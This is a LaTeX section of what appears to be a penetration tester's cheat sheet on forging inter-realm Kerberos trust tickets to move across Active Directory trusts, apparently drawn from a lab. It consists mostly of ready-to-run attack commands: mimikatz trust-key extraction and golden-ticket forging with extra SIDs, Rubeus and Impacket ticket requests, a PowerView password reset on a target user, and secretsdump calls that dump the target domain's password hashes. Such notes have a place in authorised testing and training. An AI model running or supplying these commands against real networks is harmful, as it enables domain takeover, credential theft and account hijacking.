\subsection{Trust ticket - forge inter-realm TGT}
\label{kerberos:trust_inter_realm}

Same attack as golden with ExtraSID~\ref{kerberos:golden-extra-sid-ticket} with :
\begin{itemize}
    \item trust account nthash instead of krbtgt
    \item specify a spn for the target domain (\verb+krbtgt/<dest_domain_FQDN>+)
\end{itemize}

Note: in case of SIDFiltering this attack can be used on External trust where usually RID > 1000 are not filtered to  exploit ACL granted for not buildin groups.

Extra SID can be \verb+<target_domain_sid>-519+ or any RID > 1000 on intraforest


\subsubsection{From Windows}

\begin{verbatim}
lsadump::trust /patch
or find the TRUST_NAME$ machine account hash
\end{verbatim}

mimikatz
\begin{verbatim}
kerberos::golden \
    /user:<user> /id:<user_rid> /group:500,501,513,512,520,518 
    /rc4:<trust_nthash>  
    /sid:<src_domain_sid> /domain:<src_domain_FQDN> 
    /sids:<dest_domain_sid>-<rid|519> 
    /service:krbtgt /target:<target_domain_fqdn> 
    /ptt [/ticket:c:\temp\trust.kirbi]
\end{verbatim}


after the TGT has been forged it is used to request a ST on target domain
\begin{verbatim}
.\Rubeus.exe asktgs /ticket:c:\temp\trust.kirbi /service:LDAP/<dest_dc_fqdn>. /dc:<dest_dc_fqdn> /ptt
\end{verbatim}

and use the service ticket
\begin{verbatim}
Import-Module .\powerview.ps1
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-DomainUserPassword -Identity <name> -AccountPassword $SecPassword -Domain <target_domain_fqdn>
\end{verbatim}



\subsubsection{From Linux}
\begin{verbatim}
secretsdump -just-dc-user '<target_domain_netbios>$' \
 '<domain>/<user>:<password>'@<dc_fqdn>
\end{verbatim}


\begin{verbatim}
ticketer.py \
    -nthash <trust_nthash> \
    -domain-sid "src_domain_SID" \
    -domain "src_domain_FQDN" \
    -extra-sid "<dest_domain_SID>-<RID>" \
    -spn "krbtgt/<dest_domain_FQDN>" \
    -user-id <user_rid>
    <user|jubeaz>
\end{verbatim}


after the TGT has been forged it is used to request a ST on target domain

\begin{verbatim}
KRB5CCNAME=/tmp/jubeaz.ccache getST.py \
    -debug -k -no-pass -spn cifs/dc03.admin.offshore.com \
    admin.offshore.com/jubeaz@admin.offshore.com
\end{verbatim}

use the service ticket:
\begin{verbatim}
KRB5CCNAME=jubeaz@admin.offshore.com.ccache smbclient.py \
    -k -no-pass jubeaz@dc03.admin.offshore.com


KRB5CCNAME=jubeaz@admin.offshore.com.ccache secretsdump.py \
    -k -no-pass -just-dc-ntlm jubeaz@dc03.admin.offshore.com
\end{verbatim}
